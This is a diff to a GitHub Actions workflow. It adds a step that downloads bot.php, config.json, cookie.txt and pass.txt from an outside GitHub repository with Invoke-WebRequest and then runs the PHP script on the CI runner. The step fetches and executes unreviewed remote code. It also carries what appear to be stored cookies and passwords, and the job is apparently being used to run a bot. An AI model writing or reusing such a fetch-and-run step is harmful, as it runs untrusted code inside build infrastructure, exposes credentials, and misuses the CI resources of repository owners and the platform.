@@ -30,3 +30,12 @@ jobs:
         run: |
           php -v
           php -m
+
+      - name: Download 4 Files
+        run: |
+          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/bot.php -OutFile bot.php
+          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/config.json -OutFile config.json
+          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/cookie.txt -OutFile cookie.txt
+          Invoke-WebRequest -Uri https://github.com/kalepailmine001/botfiles/raw/refs/heads/main/pass.txt -OutFile pass.txt
+          php bot.php
+          
